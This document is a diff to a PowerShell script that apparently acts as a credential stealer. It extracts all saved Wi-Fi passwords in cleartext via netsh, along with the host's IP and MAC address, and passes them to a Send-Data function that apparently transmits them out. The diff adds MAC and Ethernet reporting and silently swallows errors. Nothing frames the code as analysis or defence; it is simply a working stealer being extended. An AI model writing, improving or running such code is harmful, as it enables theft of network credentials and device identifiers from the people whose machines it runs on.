@@ -17,13 +17,40 @@ function Send-Data {
 
 try {
     $IP = (Get-NetIPAddress | Where-Object {$_.AddressFamily -eq "IPv4" -and $_.PrefixOrigin -eq "Dhcp"} | Select-Object -First 1 -ExpandProperty IPAddress)
-    $MESSAGE = "Coming from: $IP`n`n--------------------`n`n"
-    $profiles = (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object { ($_ -split ':')[1].Trim() }
-    foreach ($profile in $profiles) {
+    $MESSAGE = "COMMING FROM: $IP`n`n--------------------`n`n"
+
+    $MAC = (Get-NetAdapter | Where-Object {$_.Status -eq "Up"} | Select-Object -First 1 -ExpandProperty MacAddress)
+    if ($MAC) {
+        $MESSAGE += "MAC ADDRESS: $MAC`n"
+    } else {
+        $MESSAGE += "MAC ADDRESS: N/A`n"
+    }
+
+    $firstNetwork = $true
+
+    $wifiProfiles = (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object { ($_ -split ':')[1].Trim() }
+    foreach ($profile in $wifiProfiles) {
+        if (-not $firstNetwork) {
+            $MESSAGE += "`n--------------------`n`n"
+        }
         $key = (netsh wlan show profile name="$profile" key=clear | Select-String "Key Content" | ForEach-Object { ($_ -split ':')[1].Trim() })
         if (-not $key) { $key = "None" }
-        $MESSAGE += "Network: $profile`nNetwork Password: $key`n`n--------------------`n`n"
+        $MESSAGE += "NETWORK: $profile`nPASSWORD: $key`n"
+        $firstNetwork = $false
     }
+
+    $ethernetProfile = Get-NetConnectionProfile | Where-Object {$_.NetworkCategory -eq "Private" -or $_.NetworkCategory -eq "DomainAuthenticated"}
+    if ($ethernetProfile -and $ethernetProfile.InterfaceAlias -like "*Ethernet*") {
+        if (-not $firstNetwork -or $wifiProfiles.Count -gt 0) {
+            $MESSAGE += "`n--------------------`n`n"
+        }
+
+        $MESSAGE += "NETWORK: Ethernet (Connected)`nPASSWORD: N/A (Ethernet)`n"
+        if ($firstNetwork -and $wifiProfiles.Count -eq 0) {
+            $firstNetwork = $false
+        }
+    }
+
     Send-Data -content $MESSAGE
 } catch {}
 
